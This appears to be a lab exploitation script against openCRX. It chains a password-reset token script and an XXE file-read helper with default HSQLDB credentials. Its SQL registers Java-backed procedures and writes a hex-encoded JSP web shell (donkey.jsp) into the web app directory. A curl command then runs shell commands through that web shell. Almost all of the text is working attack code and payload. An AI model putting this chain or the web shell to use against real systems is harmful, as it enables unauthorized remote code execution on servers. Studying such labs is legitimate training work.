# reset password because it's how our xxe validation works.
./opencrx-reset-token.ps1
# write webshell via hsql
#java -jar sqltool.jar --inlineRC=url=jdbc:hsqldb:hsql://opencrx:9001/CRX,user=sa
echo manager99 | java -jar sqltool.jar --inlineRC=url=jdbc:hsqldb:hsql://opencrx:9001/CRX,user=sa q1.sql
echo manager99 | java -jar sqltool.jar --inlineRC=url=jdbc:hsqldb:hsql://opencrx:9001/CRX,user=sa q2.sql
Write-Host 'curl http://opencrx:8080/opencrx-core-CRX/donkey.jsp?cmd=id'
<#
# host wrapper.dtd
Start-Job -ScriptBlock { python3 -m http.server 80 }
# verify webshell written is successfull
python3 xxe-dirlisting-fileread.py --host 192.168.119.136 --file '/home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/donkey.jsp'
#>





###########################################################################################################################################
<#
java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://opencrx:9001/CRX --user sa --password manager99
java -jar sqltool.jar --inlineRC=url=jdbc:hsqldb:hsql://opencrx:9001/CRX,user=sa 
echo manager99 | java -jar sqltool.jar --inlineRC=url=jdbc:hsqldb:hsql://opencrx:9001/CRX,user=sa test1.sql


CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR 
LANGUAGE JAVA 
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'


CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(2048)) 
LANGUAGE JAVA 
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'

call writeBytesToFilename('../../apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/donkey.jsp', cast ('3c464f524d204d4554484f443d47455420414354494f4e3d27646f6e6b65792e6a7370273e3c494e505554206e616d653d27636d642720747970653d746578743e3c494e50555420747970653d7375626d69742076616c75653d2752756e273e3c2f464f524d3e3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e3c25202020537472696e6720636d64203d20726571756573742e676574506172616d657465722822636d6422293b202020537472696e67206f7574707574203d2022223b202020696628636d6420213d206e756c6c29207b202020202020537472696e672073203d206e756c6c3b202020202020747279207b20202020202020202050726f636573732070203d2052756e74696d652e67657452756e74696d6528292e6578656328636d64293b2020202020202020204275666665726564526561646572207349203d206e6577204275666665726564526561646572286e657720496e70757453747265616d52656164657228702e676574496e70757453747265616d282929293b2020202020202020207768696c65282873203d2073492e726561644c696e6528292920213d206e756c6c29207b2020202020202020202020206f7574707574202b3d20733b2020202020202020207d2020202020207d202020202020636174636828494f457863657074696f6e206529207b202020202020202020652e7072696e74537461636b547261636528293b2020202020207d2020207d253e3c7072653e3c253d6f757470757420253e3c2f7072653e0a' AS VARBINARY(2048)))

CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'; values(systemprop('java.class.path'))


CREATE FUNCTION systemprop(IN key VARCHAR(1024)) RETURNS VARCHAR(1024) LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'; values(systemprop('java.class.path'))
#>